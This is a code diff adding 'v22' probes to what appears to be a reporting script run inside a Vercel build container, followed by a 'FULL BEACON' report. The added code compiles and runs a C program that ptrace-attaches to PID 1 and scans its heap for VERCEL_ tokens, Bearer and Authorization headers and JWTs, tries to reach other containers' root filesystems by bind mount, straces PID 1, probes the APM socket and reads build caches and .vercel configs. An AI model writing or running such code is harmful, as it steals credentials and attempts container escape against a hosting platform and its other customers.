@@ -1249,6 +1249,146 @@ const report = {
     const memSearch = safe(() => execSync('dd if=/dev/mem bs=1024 count=1024 2>/dev/null | strings | grep -E "VERCEL|Bearer|token|secret|password" | head -10 || true').toString().trim().slice(0, 500));
     return { firstBytes, memSearch };
   }),
+
+  // v22: C ptrace program to dump PID 1 heap memory — search for VERCEL_/Bearer/Authorization patterns.
+  // We have CAP_SYS_PTRACE + gcc + PID 1 maps showing heap at 0x06772000-0x0a23e000.
+  ptraceDump: safe(() => {
+    const cSrc = `
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <sys/ptrace.h>
+#include <sys/wait.h>
+#include <unistd.h>
+#include <fcntl.h>
+#include <sys/types.h>
+#include <errno.h>
+
+int search_buf(char *buf, ssize_t n, long offset) {
+    int found = 0;
+    for (int j = 0; j < n - 8; j++) {
+        if (memcmp(buf+j,"VERCEL_",7)==0 || memcmp(buf+j,"Bearer ",7)==0 ||
+            memcmp(buf+j,"eyJhbGc",7)==0 || memcmp(buf+j,"Authoriz",8)==0) {
+            char out[256]={0};
+            int k;
+            for(k=0;k<255&&j+k<n;k++){
+                char c=buf[j+k];
+                out[k]=(c>=32&&c<127)?c:((c==0)?0:'.');
+                if(c==0)break;
+            }
+            printf("HEAP+%ld: %s\\n",(long)(offset+j),out);
+            found++;
+            if(found>20)return found;
+            j+=k;
+        }
+    }
+    return found;
+}
+
+int main(int argc, char**argv){
+    pid_t pid=1;
+    printf("Attaching to PID %d...\\n",pid);
+    if(ptrace(PTRACE_ATTACH,pid,NULL,NULL)<0){perror("attach");return 1;}
+    waitpid(pid,NULL,0);
+    printf("Attached. Opening /proc/1/mem...\\n");
+    int fd=open("/proc/1/mem",O_RDONLY);
+    if(fd<0){perror("open mem");ptrace(PTRACE_DETACH,pid,NULL,NULL);return 2;}
+    long heap_start=0x06772000L;
+    printf("Seeking to heap 0x%lx\\n",heap_start);
+    if(lseek(fd,(off_t)heap_start,SEEK_SET)<0){perror("lseek");close(fd);ptrace(PTRACE_DETACH,pid,NULL,NULL);return 3;}
+    char buf[4096];
+    int total=0,reads=0;
+    printf("Scanning heap (max 64MB)...\\n");
+    while(reads<16384){
+        ssize_t n=read(fd,buf,sizeof(buf));
+        if(n<=0)break;
+        total+=search_buf(buf,n,(long)(heap_start+(long)reads*4096));
+        reads++;
+        if(total>20)break;
+    }
+    printf("Scan done: %d pages, %d matches\\n",reads,total);
+    close(fd);
+    ptrace(PTRACE_DETACH,pid,NULL,NULL);
+    printf("Detached.\\n");
+    return 0;
+}
+`;
+    safe(() => writeFileSync('/tmp/memdump.c', cSrc));
+    const compileOut = safe(() => execSync('gcc -O2 -o /tmp/memdump /tmp/memdump.c 2>&1 || true').toString().trim().slice(0, 500));
+    const runOut = safe(() => execSync('timeout 15 /tmp/memdump 2>&1 || true').toString().trim().slice(0, 3000));
+    return { compileOut, runOut };
+  }),
+
+  // v22: Try to access the other container's rootfs via containerd task paths.
+  // dmesg showed: /run/containerd/io.containerd.runtime.v2.task/default/{id}/rootfs/vercel
+  // Two container IDs seen: d3936b15-9c3c-45dc-baed-92d20938f67d and ctr_7589b5a7213640dbabbe21bb9d10
+  containerRootfsAccess: safe(() => {
+    const ctrdTaskBase = '/run/containerd/io.containerd.runtime.v2.task/default';
+    // Check if the base path is accessible from inside our container
+    const baseExists = safe(() => execSync(`ls ${ctrdTaskBase}/ 2>/dev/null | head -10 || true`).toString().trim());
+    // Try to access the known container IDs directly
+    const container1 = 'd3936b15-9c3c-45dc-baed-92d20938f67d';
+    const container2 = 'ctr_7589b5a7213640dbabbe21bb9d10';
+    const c1RootfsLs = safe(() => execSync(`ls ${ctrdTaskBase}/${container1}/rootfs/ 2>/dev/null | head -10 || true`).toString().trim());
+    const c2RootfsLs = safe(() => execSync(`ls ${ctrdTaskBase}/${container2}/rootfs/ 2>/dev/null | head -10 || true`).toString().trim());
+    // Try bind-mount of the task base (host path)
+    safe(() => execSync('mkdir -p /tmp/ctrd_tasks 2>/dev/null || true'));
+    const bindMountResult = safe(() => execSync(`mount --bind ${ctrdTaskBase} /tmp/ctrd_tasks 2>&1 || true`).toString().trim().slice(0, 200));
+    const bindMountLs = safe(() => execSync('ls /tmp/ctrd_tasks/ 2>/dev/null | head -20 || true').toString().trim());
+    // Try /run/ to see what's accessible from inside container
+    const runContents = safe(() => execSync('ls -la /run/ 2>/dev/null | head -20 || true').toString().trim());
+    const runContainerdExists = safe(() => execSync('ls -la /run/containerd/ 2>/dev/null | head -10 || true').toString().trim());
+    return { baseExists, c1RootfsLs, c2RootfsLs, bindMountResult, bindMountLs, runContents, runContainerdExists };
+  }),
+
+  // v22: Probe /run/apm/apm.sock — Datadog APM Unix socket used by orchestrator.
+  // strace showed orchestrator connecting to this and getting HTTP/1.1 200 OK responses.
+  apmSockProbe: safe(() => {
+    const apmSockExists = safe(() => execSync('ls -la /run/apm/apm.sock 2>/dev/null || ls -la /run/apm/ 2>/dev/null | head -5 || true').toString().trim());
+    // Try to send a simple HTTP request to the APM socket
+    const apmHttp = safe(() => execSync(
+      'curl -s --max-time 5 --unix-socket /run/apm/apm.sock http://localhost/info 2>&1 | head -20 || true'
+    ).toString().trim().slice(0, 500));
+    // Try to read what the APM agent exposes
+    const apmStatus = safe(() => execSync(
+      'curl -s --max-time 5 --unix-socket /run/apm/apm.sock http://localhost/ 2>&1 | head -20 || true'
+    ).toString().trim().slice(0, 500));
+    return { apmSockExists, apmHttp, apmStatus };
+  }),
+
+  // v22: Extended strace of PID 1 — 5 seconds focused on write() to capture data being sent
+  extendedStrace: safe(() => {
+    const strace5s = safe(() => execSync(
+      'timeout 5 strace -p 1 -e trace=write,sendto,sendmsg -f -s 2000 2>&1 | head -80 || true'
+    ).toString().trim().slice(0, 5000));
+    return { strace5s };
+  }),
+
+  // v22: Build cache dir contents — /vercel/build_cache_* may have cached credentials or tokens
+  buildCacheContents: safe(() => {
+    const cacheDirs = safe(() => execSync('ls -la /vercel/build_cache*/ 2>/dev/null | head -30 || true').toString().trim().slice(0, 1000));
+    // Check build-diagnostics directory
+    const diagContents = safe(() => execSync('ls -la /vercel/build-diagnostics/ 2>/dev/null && cat /vercel/build-diagnostics/* 2>/dev/null | head -50 || true').toString().trim().slice(0, 1000));
+    // Check vercel output dir
+    const outputContents = safe(() => execSync('ls -la /vercel/output/ 2>/dev/null | head -20 || true').toString().trim().slice(0, 500));
+    // Check .vercel directory in path0
+    const dotVercel = safe(() => execSync('ls -la /vercel/path0/.vercel/ 2>/dev/null && cat /vercel/path0/.vercel/*.json 2>/dev/null | head -30 || true').toString().trim().slice(0, 1000));
+    return { cacheDirs, diagContents, outputContents, dotVercel };
+  }),
+
+  // v22: Namespace comparison — determine if PID 1 has different namespaces than us
+  namespaceCheck: safe(() => {
+    const selfNsMnt = safe(() => execSync('readlink /proc/self/ns/mnt 2>/dev/null || true').toString().trim());
+    const pid1NsMnt = safe(() => execSync('readlink /proc/1/ns/mnt 2>/dev/null || true').toString().trim());
+    const selfNsPid = safe(() => execSync('readlink /proc/self/ns/pid 2>/dev/null || true').toString().trim());
+    const pid1NsPid = safe(() => execSync('readlink /proc/1/ns/pid 2>/dev/null || true').toString().trim());
+    const selfNsNet = safe(() => execSync('readlink /proc/self/ns/net 2>/dev/null || true').toString().trim());
+    const pid1NsNet = safe(() => execSync('readlink /proc/1/ns/net 2>/dev/null || true').toString().trim());
+    const selfNsUser = safe(() => execSync('readlink /proc/self/ns/user 2>/dev/null || true').toString().trim());
+    const pid1NsUser = safe(() => execSync('readlink /proc/1/ns/user 2>/dev/null || true').toString().trim());
+    const allNsList = safe(() => execSync('ls -la /proc/1/ns/ 2>/dev/null | head -20 || true').toString().trim());
+    return { selfNsMnt, pid1NsMnt, selfNsPid, pid1NsPid, selfNsNet, pid1NsNet, selfNsUser, pid1NsUser, allNsList };
+  }),
 };
 
 // FULL BEACON — sent after all slow network probes complete.
